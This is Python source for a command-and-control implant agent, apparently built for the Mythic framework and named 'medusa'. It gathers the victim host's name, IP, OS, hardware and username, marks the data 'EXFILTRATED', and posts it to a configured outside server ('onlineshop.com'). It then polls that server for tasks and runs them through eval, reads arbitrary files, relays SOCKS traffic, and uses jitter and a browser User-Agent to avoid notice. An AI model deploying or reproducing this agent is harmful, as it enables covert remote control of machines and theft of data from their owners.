'''
 # @ Author: Taylor Brierley, Newt Tan
 # @ Create Time: 2024-09-16 09:48:58
 # @ Modified by: Taylor Brierley, Newt Tan
 # @ Modified time: 2024-09-16 09:49:52
 # @ Description:
 '''



import os, random, sys, json, socket, base64
import time, platform
import ssl, getpass 
import psutil
import urllib.request
from datetime import datetime
import threading, queue
import enc
import time
from hmac import new, compare_digest


CHUNK_SIZE = 51200


class medusa:

    def __init__(self):
        ''' define parameter for communication with C2 server
        
        '''
        self.socks_open = {}
        self.socks_in = queue.Queue()
        self.socks_out = queue.Queue()
        self.taskings = []
        self._meta_cache = {}
        self.moduleRepo = {}
        self.current_directory = os.getcwd()
        # configure on Mythic
        self.agent_config = {
            "Server": "http://onlineshop.com",
            "Port": "80",
            "PostURI": "/data",
            "PayloadUUID": "89fe22f1-1cfe-4b65-af5e-76cf4497a9fd",
            "UUID": "",
            "Headers": {"User-Agent": "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"},
            "Sleep": 10,
            "Jitter": 23,
            "KillDate": "2025-09-13",
            "enc_key": {"dec_key": None, "enc_key": None, "value": "none"},
            # "enc_key": {"dec_key": None, "enc_key": None, "value": "aes256_hmac"},
            "ExchChk": "False",
            "GetURI": "/index",
            "GetParam": "q",
            "ProxyHost": "",
            "ProxyUser": "",
            "ProxyPass": "",
            "ProxyPort": "",
        }

        # keep scanning the target system with random intervals
        while True:
            # comment when in testing
            # self._random_time_sleep()
            if(self.agent_config["UUID"] == ""):
                self.checkIn()
                self.agentSleep()
            else:
                while True:
                    if self.passedKilldate():
                        self.exit()
                    try:
                        self.getTaskings()
                        self.processTaskings()
                        self.postResponses()
                    except: pass
                    self.agentSleep()                   

    def _random_time_sleep(self):
        ''' define the random time to avoid certain or frequent scanning
        
        '''
        # define the range of hours
        min_hours = 0.1
        max_hours = 336

        # convert hours to seconds
        time_to_sleep = random.randint(min_hours*3600, max_hours*3600)

        return time.sleep(time_to_sleep)


    def checkIn(self):
        ''' send extracted data to remote host
        
        '''
        hostname = socket.gethostname()
        ip = ''
        if hostname and len(hostname) > 0:
            try:
                ip = socket.gethostbyname(hostname)
            except:
                pass

        script_dir = os.path.dirname(os.path.abspath(__file__))

        file_path = os.path.join(script_dir, "system_info.json")
        
        system_info = self.get_system_info()
        self.save_system_info_to_file(file_path, system_info)
        print(f"System information saved to {file_path}")

        data = {
            "EXFILTRATED ": system_info,
            "action": "checkin", 
            "ip": system_info['ip_address'],
            "os": system_info['os_details']['system'],
            "user": self.getUsername(),
            "host": system_info['hostname'],
            "domain:": socket.getfqdn(),
            "pid": os.getpid(),
            "uuid": self.agent_config["PayloadUUID"],
            "architecture": "x64" if sys.maxsize > 2**32 else "x86",
            "encryption_key": self.agent_config["enc_key"]["enc_key"],
            "decryption_key": self.agent_config["enc_key"]["dec_key"]
        }
        encoded_data = base64.b64encode(self.agent_config["PayloadUUID"].encode() + \
                                         self.encrypt(json.dumps(data).encode()))
        decoded_data = self.decrypt(self.makeRequest(encoded_data, 'POST'))
        if "status" in decoded_data:
            UUID = json.loads(decoded_data.replace(self.agent_config["PayloadUUID"],""))["id"]
            self.agent_config["UUID"] = UUID
            return True
        else: 
            return False


    def get_system_info(self):
        ''' collect or scan system information
        
        '''
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        os_details = platform.uname()
        cpu_count = psutil.cpu_count(logical=True)
        cpu_freq = psutil.cpu_freq()
        virtual_memory = psutil.virtual_memory()

        
        system_info = {
            "hostname": hostname,
            "ip_address": ip_address,
            "os_details": {
                "system": os_details.system,
                "node_name": os_details.node,
                "release": os_details.release,
                "version": os_details.version,
                "machine": os_details.machine,
                "processor": os_details.processor
            },
            "cpu_details": {
                "cpu_count": cpu_count,
                "cpu_freq_max": cpu_freq.max,
                "cpu_freq_min": cpu_freq.min,
                "cpu_freq_current": cpu_freq.current
            },
            "memory_details": {
                "total_memory": virtual_memory.total,
                "available_memory": virtual_memory.available,
                "used_memory": virtual_memory.used,
                "free_memory": virtual_memory.free
            }
        }
        
        return system_info

    def save_system_info_to_file(self, file_path, system_info):
        
        with open(file_path, 'w') as file:
            json.dump(system_info, file, indent=4)


    def encrypt(self, data):
        ''' encrypt extracted data from pre-define method
        
        '''
        
        if self.agent_config["enc_key"]["value"] == "aes256_hmac" and len(data)>0:
            key = base64.b64decode(self.agent_config["enc_key"]["enc_key"])
            iv = os.urandom(16)
            ciphertext = enc.AES(key).encrypt_cbc(data, iv)
            hmac = new(key, iv + ciphertext, 'sha256').digest()
            return iv + ciphertext + hmac
        else:
            print('data to encrypt', data)
            return data

    def decrypt(self, data):
        ''' decrypt cipher based on options
        
        '''
        if self.agent_config["enc_key"]["value"] == "aes256_hmac":
            if len(data)>0:
                key = base64.b64decode(self.agent_config["enc_key"]["dec_key"])
                uuid = data[:36]
                iv = data[36:52]
                ct = data[52:-32]
                received_hmac = data[-32:]
                hmac = new(key, iv + ct, 'sha256').digest()
                if compare_digest(hmac, received_hmac):
                    return (uuid + enc.AES(key).decrypt_cbc(ct, iv)).decode()
                else: 
                    return ""
            else: 
                return ""
        else: 
            print('data to decrypt', data)
            return data.decode()


    def getOSVersion(self):
        if platform.mac_ver()[0]: return "macOS "+platform.mac_ver()[0]
        else: return platform.system() + " " + platform.release()

    def getUsername(self):
        try: return getpass.getuser()
        except: pass
        for k in [ "USER", "LOGNAME", "USERNAME" ]: 
            if k in os.environ.keys(): return os.environ[k]

    def formatMessage(self, data, urlsafe=False):
        output = base64.b64encode(self.agent_config["UUID"].encode() + self.encrypt(json.dumps(data).encode()))
        if urlsafe: 
            output = base64.urlsafe_b64encode(self.agent_config["UUID"].encode() + self.encrypt(json.dumps(data).encode()))
        return output

    def formatResponse(self, data):
        return json.loads(data.replace(self.agent_config["UUID"],""))

    def postMessageAndRetrieveResponse(self, data):
        return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data),'POST')))

    def getMessageAndRetrieveResponse(self, data):
        return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data, True))))

    def sendTaskOutputUpdate(self, task_id, output):
        responses = [{ "task_id": task_id, "user_output": output, "completed": False }]
        message = { "action": "post_response", "responses": responses }
        response_data = self.postMessageAndRetrieveResponse(message)

    def postResponses(self):
        ''' specify the structure when posting response
        
        '''
        try:
            responses = []
            socks = []
            taskings = self.taskings
            for task in taskings:
                if task["completed"] == True:
                    out = { "task_id": task["task_id"], "user_output": task["result"], "completed": True }
                    if task["error"]: out["status"] = "error"
                    for func in ["processes", "file_browser"]: 
                        if func in task: out[func] = task[func]
                    responses.append(out)
            while not self.socks_out.empty(): socks.append(self.socks_out.get())
            if ((len(responses) > 0) or (len(socks) > 0)):
                message = { "action": "post_response", "responses": responses }
                if socks: message["socks"] = socks
                response_data = self.postMessageAndRetrieveResponse(message)
                for resp in response_data["responses"]:
                    task_index = [t for t in self.taskings \
                        if resp["task_id"] == t["task_id"] \
                        and resp["status"] == "success"][0]
                    self.taskings.pop(self.taskings.index(task_index))
        except: pass

    def processTask(self, task):
        ''' call function/task to execute
        
        '''
        try:
            task["started"] = True
            function = getattr(self, task["command"], None)
            if(callable(function)):
                try:
                    params = json.loads(task["parameters"]) if task["parameters"] else {}
                    params['task_id'] = task["task_id"] 
                    command =  "self." + task["command"] + "(**params)"
                    output = eval(command)
                except Exception as error:
                    output = str(error)
                    task["error"] = True                        
                task["result"] = output
                task["completed"] = True
            else:
                task["error"] = True
                task["completed"] = True
                task["result"] = "Function unavailable."
        except Exception as error:
            task["error"] = True
            task["completed"] = True
            task["result"] = error

    def processTaskings(self):
        ''' run tasks in a loop
        
        '''
        threads = list()       
        taskings = self.taskings     
        for task in taskings:
            if task["started"] == False:
                x = threading.Thread(target=self.processTask, name="{}:{}".format(task["command"], task["task_id"]), args=(task,))
                threads.append(x)
                x.start()

    def getTaskings(self):
        ''' receive commands from C2 server
        
        '''
        data = { "action": "get_tasking", "tasking_size": -1 }
        tasking_data = self.getMessageAndRetrieveResponse(data)
        for task in tasking_data["tasks"]:
            t = {
                "task_id":task["id"],
                "command":task["command"],
                "parameters":task["parameters"],
                "result":"",
                "completed": False,
                "started":False,
                "error":False,
                "stopped":False
            }
            self.taskings.append(t)
        if "socks" in tasking_data:
            for packet in tasking_data["socks"]: self.socks_in.put(packet)

    
    def makeRequest(self, data, method='GET'):
        ''' send requset for C2 communication
        
        '''
        hdrs = {}
        for header in self.agent_config["Headers"]:
            hdrs[header] = self.agent_config["Headers"][header]
        if method == 'GET':
            req = urllib.request.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["GetURI"] + "?" + \
                                         self.agent_config["GetParam"] + "=" + data.decode(), None, hdrs)
        else:
            req = urllib.request.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["PostURI"], data, hdrs)
        
        if self.agent_config["ProxyHost"] and self.agent_config["ProxyPort"]:
            tls = "https" if self.agent_config["ProxyHost"][0:5] == "https" else "http"
            handler = urllib.request.HTTPSHandler if tls else urllib.request.HTTPHandler
            if self.agent_config["ProxyUser"] and self.agent_config["ProxyPass"]:
                proxy = urllib.request.ProxyHandler({
                    "{}".format(tls): '{}://{}:{}@{}:{}'.format(tls, self.agent_config["ProxyUser"], self.agent_config["ProxyPass"], \
                        self.agent_config["ProxyHost"].replace(tls+"://", ""), self.agent_config["ProxyPort"])
                })
                auth = urllib.request.HTTPBasicAuthHandler()
                opener = urllib.request.build_opener(proxy, auth, handler)
            else:
                proxy = urllib.request.ProxyHandler({
                    "{}".format(tls): '{}://{}:{}'.format(tls, self.agent_config["ProxyHost"].replace(tls+"://", ""), self.agent_config["ProxyPort"])
                })
                opener = urllib.request.build_opener(proxy, handler)
            urllib.request.install_opener(opener)
        try:
            with urllib.request.urlopen(req) as response:
                out = base64.b64decode(response.read())
                response.close()
                return out
        except: return ""

    def passedKilldate(self):
        ''' define specific date to kill whole communication
        
        '''
        kd_list = [ int(x) for x in self.agent_config["KillDate"].split("-")]
        kd = datetime(kd_list[0], kd_list[1], kd_list[2])
        if datetime.now() >= kd: return True
        else: return False

    def agentSleep(self):
        j = 0
        if int(self.agent_config["Jitter"]) > 0:
            v = float(self.agent_config["Sleep"]) * (float(self.agent_config["Jitter"])/100)
            if int(v) > 0:
                j = random.randrange(0, int(v))    
        time.sleep(self.agent_config["Sleep"]+j)

    def cat(self, task_id, path):
        file_path = path if path[0] == os.sep \
                else os.path.join(self.current_directory,path)
        
        with open(file_path, 'r') as f:
            content = f.readlines()
            return ''.join(content)

if __name__ == "__main__":
    medusa = medusa()
